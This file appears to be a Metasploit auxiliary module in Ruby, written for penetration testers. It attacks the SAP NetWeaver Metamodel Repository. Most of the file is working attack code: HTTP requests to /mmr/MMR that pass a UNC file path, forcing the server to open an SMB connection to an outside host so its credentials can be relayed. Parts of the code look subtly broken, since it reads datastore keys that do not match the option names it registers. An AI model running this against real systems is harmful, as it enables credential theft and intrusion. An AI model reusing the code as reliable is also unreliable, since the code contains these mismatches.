##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

##
# This module is based on, inspired by, or is a port of a plugin available in
# the Onapsis Bizploit Opensource ERP Penetration Testing framework -
# http://www.onapsis.com/research-free-solutions.php.
# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts
# in producing the Metasploit modules and was happy to share his knowledge and
# experience - a very cool guy.
#
# The following guys from ERP-SCAN deserve credit for their contributions -
# Alexandr Polyakov, Alexey Sintsov, Alexey Tyurin, Dmitry Chastukhin and
# Dmitry Evdokimov.
#
# I'd also like to thank Chris John Riley, Ian de Villiers and Joris van de Vis
# who have Beta tested the modules and provided excellent feedback. Some people
# just seem to enjoy hacking SAP :)
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary
	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name' => 'SAP MMR service SMB Relay',
			'Description' => %q{
				This module exploits the SAP NetWeaver MMR SMB relay vulnerability.
				SAP Netweaver Metamodel Repository can be accessed without authentication by default in the old versions of SAP ECC.
								},
			'References' => [['URL','http://labs.mwrinfosecurity.com']],
			'Author' => ['nmonkee'],
			'License' => MSF_LICENSE
			)
		register_options([
			OptString.new('CLIENT', [true, 'SAP client', nil]),
			OptString.new('USERNAME', [true, 'Username', nil]),
			OptString.new('PASSWORD', [true, 'Password', nil]),
			OptString.new('FILEPATH',[true,'File path (e.g. \\\\xx.xx.xx.xx\\filename)',nil]),
			], self.class)
	end

	def run_host(ip)
		user_pass = Rex::Text.encode_base64(datastore['USER'] + ":" + datastore['PASS'])
		begin
			if datastore['USER'].empty?
				vprint_status("[SAP] #{ip}:#{rport} - Sending unauthenticated request for #{datastore['FILEPATH']}")
				res = send_request_cgi({
					'uri' => '/mmr/MMR',
					'method' => 'GET',
					'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
					'ctype' => 'text/xml; charset=UTF-8',
					'vars_get' => {
						'sap-client' => datastore['CLIENT'],
						'sap-language' => 'EN',
						'filename' => + datastore['FILEPATH']
					}
				})

			else
				vprint_status("[SAP] #{ip}:#{rport} - Sending unauthenticated request for #{datastore['FILEPATH']}")
				res = send_request_cgi({
					'uri' => '/mmr/MMR',
					'method' => 'GET',
					'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
					'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
					'ctype' => 'text/xml; charset=UTF-8',
					'vars_get' => {
						'sap-client' => datastore['CLIENT'],
						'sap-language' => 'EN',
						'filename' => + datastore['FILEPATH']
					}
				})
			end
			if res
					vprint_status("[SAP] #{rhost}:#{rport} - Error code: " + res.code.to_s)
					vprint_status("[SAP] #{rhost}:#{rport} - Error title: " + res.message.to_s)
					vprint_status("[SAP] #{rhost}:#{rport} - Error message: " + res.body.to_s)
			end
			rescue ::Rex::ConnectionError
				print_error("#{rhost}:#{rport} - Unable to connect")
				return
			end
		end
	end
